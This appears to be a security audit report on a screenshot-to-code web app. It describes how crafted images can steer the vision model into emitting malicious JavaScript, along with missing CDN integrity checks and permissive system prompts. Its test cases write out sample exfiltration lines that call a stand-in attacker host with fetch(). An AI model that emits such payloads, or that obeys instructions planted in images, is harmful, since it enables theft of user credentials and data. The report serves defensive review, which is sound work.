- **Vulnerability Name**: Unsanitized AI-Generated Code Output
  **Description**:
  1. The backend receives a malicious image input from an attacker, which is intended to trick the AI into generating harmful code (e.g., JavaScript with RCE/XSS payloads).
  2. The system processes the image via the FastAPI endpoint and sends it to the AI (e.g., GPT-4 Vision or Claude Sonnet 3.7) with minimal constraints.
  3. The AI generates code (e.g., HTML with embedded scripts) that includes dangerous logic such as `eval()`, `fetch()` calls to attacker-controlled endpoints, or inline JavaScript with malicious functionality.
  4. The backend’s `extract_html_content` and `generate_images` functions process the AI response but do **not** perform any validation or sanitization of the generated code.
  5. The raw, unfiltered code is returned to the user via the WebSocket endpoint `/generate-code`, who may then execute it in their environment.
  **Impact**:
  A malicious user can craft an image that instructs the AI to generate harmful code (e.g., JavaScript for credential theft, RCE, or XSS). When the user implements the code, it executes in their browser or server, leading to unauthorized access, data exposure, or complete system compromise.
  **Vulnerability Rank**: Critical
  **Currently Implemented Mitigations**:
  - None. The code does not include any validation, sanitization, or static analysis of the AI-generated output.
  **Missing Mitigations**:
  - Lack of input validation on the AI’s generated code.
  - No checks for dangerous keywords (e.g., `eval`, `fetch`, `exec`, `<script>`) or patterns (e.g., event listeners with malicious payloads).
  - No sandboxing or dynamic analysis of the generated code before delivery to the user.
  - No rate limiting on API endpoints to prevent abuse.
  **Preconditions**:
  - The attacker must have access to the hosted version of the app or a local instance (via Docker or manual setup).
  - The attacker must craft an image (or video) that visually mimics UI components requiring malicious JavaScript.
  **Source Code Analysis**:
  - In `routes/generate_code.py`, the AI-generated code is processed via `extract_html_content` (which trims only non-HTML parts) and then returned directly to the user:
    ```python
    completions = [extract_html_content(completion) for completion in completions]
    ...
    await send_message("setCode", updated_html, index)
    ```
  - The system prompts (e.g., `HTML_TAILWIND_SYSTEM_PROMPT`, `REACT_TAILWIND_SYSTEM_PROMPT`) explicitly allow usage of JavaScript for interactivity, leaving the door open for malicious scripts.
    ```python
    "- Make sure to always get the layout right... using JS.
    - Use jQuery for interactions..."
    ```
  - Mock responses in `mock_llm.py` include JavaScript (e.g., jQuery code in `MORTGAGE_CALCULATOR_VIDEO_PROMPT_MOCK`), confirming that the backend expects and delivers code with scripts.
  **Security Test Case**:
  1. Upload an image (or video) to the hosted instance that visually represents a UI element with a malicious JavaScript trigger (e.g., a button with `onclick="fetch('attacker.com/stolen-data')"`).
  2. The AI generates code that includes the `onclick` handler with the attacker’s payload.
  3. Download the generated code and verify the presence of the malicious script.
  4. Deploy the code in a local environment and trigger the malicious JavaScript to observe data exfiltration or RCE.

- **Vulnerability Name**: Exposure to Third-Party CDN Compromise
  **Description**:
  1. The AI is instructed to include third-party libraries (e.g., jQuery, Bootstrap, React scripts) via hardcoded CDN URLs.
  2. An attacker compromises one of these CDNs (e.g., cdn.tailwindcss.com or cdnjs.cloudflare.com) to inject malicious code into the referenced files.
  3. The generated code uses these compromised CDN links, causing the malicious scripts to execute in the user’s environment when the code is deployed.
  **Impact**:
  If a CDN is compromised, users could unknowingly include remote JavaScript that steals credentials, executes arbitrary code, or manipulates the app’s behavior.
  **Vulnerability Rank**: High
  **Currently Implemented Mitigations**:
  - None. The backend uses fixed CDN URLs without any integrity checks.
  **Missing Mitigations**:
  - Lack of subresource integrity (SRI) hashes for third-party scripts.
  - No code to validate the integrity of CDN-hosted libraries before inclusion.
  **Preconditions**:
  - The attacker must have control over or ability to compromise a third-party CDN used by the system.
  - The user must deploy the generated code that references the compromised CDN.
  **Source Code Analysis**:
  - All system prompts (e.g., `HTML_TAILWIND_SYSTEM_PROMPT`, `REACT_TAILWIND_SYSTEM_PROMPT`) explicitly require third-party CDN URLs for libraries:
    ```python
    "- Use this script to include Tailwind: <script src='https://cdn.tailwindcss.com'></script>"
    ```
  - The mock code in `mock_llm.py` includes CDN references such as `https://code.jquery.com/jquery-3.7.1.min.js`, which are vulnerable to CDN compromise.
  **Security Test Case**:
  1. Compromise a third-party CDN (e.g., host a malicious script on a temporarily hijacked domain like cdn.tailwindcss.com).
  2. Generate code via the app that uses the CDN (e.g., request HTML with Tailwind).
  3. Deploy the generated code and confirm that the malicious script from the compromised CDN executes.

- **Vulnerability Name**: Overly Permissive AI Prompts Enable Malicious Output
  **Description**:
  1. The system prompts for AI models (e.g., `HTML_TAILWIND_SYSTEM_PROMPT`) explicitly require the AI to "generate the full code" without mentioning security restrictions.
  2. An attacker crafts an image that visually includes code comments or UI elements that suggest malicious JavaScript logic (e.g., a button labeled "Phishing Login").
  3. The AI follows the prompt to produce fully functional code, including the attacker’s malicious logic.
  **Impact**:
  The AI’s lack of security constraints in prompts allows generation of harmful code patterns (e.g., credential phishing pages).
  **Vulnerability Rank**: Critical
  **Currently Implemented Mitigations**:
  - None. The system prompts focus on UI accuracy and code completeness but omit any security guidelines.
  **Missing Mitigations**:
  - No prompt engineering to explicitly disallow dangerous JavaScript patterns.
  - No validation that the AI adheres to security boundaries (e.g., disallow event listeners with `eval()` or external script injection).
  **Preconditions**:
  - The attacker must trick the AI into generating code with malicious behaviors.
  **Source Code Analysis**:
  - The system prompts in `prompts/screenshot_system_prompts.py` and `prompts/claude_prompts.py` instruct the AI to prioritize exact replication but lack safeguards:
    ```python
    "- Do not add comments... but WRITE THE FULL CODE."
    "- Make sure the app looks *exactly* like the screenshot."
    ```
  **Security Test Case**:
  1. Provide an image of a login form with a "Forget Password" button.
  2. In the image, include a hidden or visual cue that the button triggers `fetch('attacker.com', {method: 'POST', data: form_data})`.
  3. Generate code via the app and confirm that the JavaScript (`fetch` call) is included in the output.
